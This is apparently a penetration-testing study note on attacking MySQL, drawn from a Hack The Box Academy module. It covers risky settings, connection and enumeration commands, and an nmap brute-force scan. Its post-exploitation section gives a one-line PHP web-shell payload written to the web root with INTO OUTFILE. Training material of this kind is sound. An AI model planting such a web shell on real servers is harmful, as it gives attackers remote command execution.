Usual Port: 3306

Vulnerable Settings:

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
Common Actions:
Accessing server via mysql
```
mysql -u <username> -h <ip>
#or
mysql -u <username> -p<password> -h <ip> #Insecure, as pw is available at history
```

Common Commands:

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected table.                                                               |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |
| `describe <table>`                                   | Show the schema for the specified table                                                               |

Automated Tools:

--Using nmap to perform automated brute:
```
sudo nmap <ip> -sV -sC -p3306 --script mysql*
```

Post Exploit:

In mysql, we can write to local files if we gained access:

Using MySQL to write Local File:
```
SELECT "<string_to_be_written_in_file>" INTO OUTFILE '<file_abspath>'
#Example
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
Note: The readiness of this operation is limited by a global system variable, secure_file_priv, also file operations re

Ref: https://academy.hackthebox.com/app/module/112/section/1238